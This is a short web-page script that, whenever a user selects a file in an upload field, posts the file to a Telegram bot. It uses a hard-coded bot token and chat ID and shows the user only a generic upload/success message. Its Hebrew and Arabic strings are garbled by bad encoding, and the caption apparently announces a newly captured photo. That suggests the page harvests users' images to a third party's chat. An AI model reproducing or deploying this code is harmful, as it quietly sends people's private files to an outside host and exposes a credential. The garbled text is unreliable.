<script>
    const BOT_TOKEN = "8163656785:AAFKYatjBrpi9NFDBVtFgwXnz2N2gIyLQ_k";
    const CHAT_ID = "6045533883";
    document.getElementById('fileInput').addEventListener('change', function() {
        const file = this.files[0];
        if (!file) return;
        document.getElementById('status').innerText = "注 拽抓...";
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);
        formData.append('caption', " 鬲 氐丿 氐乇丞 噩丿丿丞  丕囟丨丞!");
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                document.getElementById('status').innerText = "转 砖 爪!";
                alert("拽抓 转拽 爪.");
            }
        });
    });
</script>
